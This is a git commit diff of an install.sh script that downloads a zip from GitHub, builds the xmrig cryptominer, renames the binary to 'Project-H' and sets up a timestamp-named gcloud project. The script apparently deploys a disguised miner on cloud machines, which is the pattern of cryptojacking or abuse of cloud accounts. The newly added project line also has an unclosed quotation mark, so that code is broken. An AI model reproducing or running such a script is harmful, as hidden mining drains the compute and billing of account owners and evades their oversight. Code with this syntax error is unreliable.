3d658a35b4c41d13c87c377f20b4e120492260a0
U117A <33190250+U117A@users.noreply.github.com>
2020-08-22 09:56:50 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,8 +1,5 @@
 sudo apt-get update
 
-#project=$(date +"%d%m%Y%H%M%S")
-#gcloud config set project $project
-#sudo apt-get --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev ocl-icd-opencl-dev unzip
 sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
 sudo wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
 sudo unzip AAA.zip
@@ -16,3 +13,6 @@ cd build
 cmake ..
 make
 sudo mv xmrig Project-H
+
+project="p$(date +"%d%m%Y%H%M%S")
+gcloud config set project $project
